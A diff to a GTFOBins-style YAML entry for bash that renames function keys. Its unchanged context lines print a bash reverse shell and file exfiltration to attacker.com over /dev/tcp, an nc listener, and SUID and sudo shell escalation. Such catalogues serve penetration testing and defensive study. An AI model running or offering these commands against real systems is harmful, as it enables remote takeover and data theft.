@@ -1,14 +1,14 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - code: bash
-  reverse-shell-interactive:
+  reverse-shell:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
         export RPORT=12345
         bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
-  upload:
+  file-upload:
     - description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
       code: |
         export RHOST=attacker.com
@@ -21,7 +21,7 @@ functions:
         export RPORT=12345
         export LFILE=file_to_send
         bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
-  download:
+  file-download:
     - description: Fetch a remote file via HTTP GET request.
       code: |
         export RHOST=attacker.com
@@ -58,8 +58,8 @@ functions:
         HISTTIMEFORMAT=$'\r\e[K'
         history -r $LFILE
         history
-  suid-enabled:
+  suid:
     - code: "./bash -p"
-  sudo-enabled:
+  sudo:
     - code: sudo bash
 ---
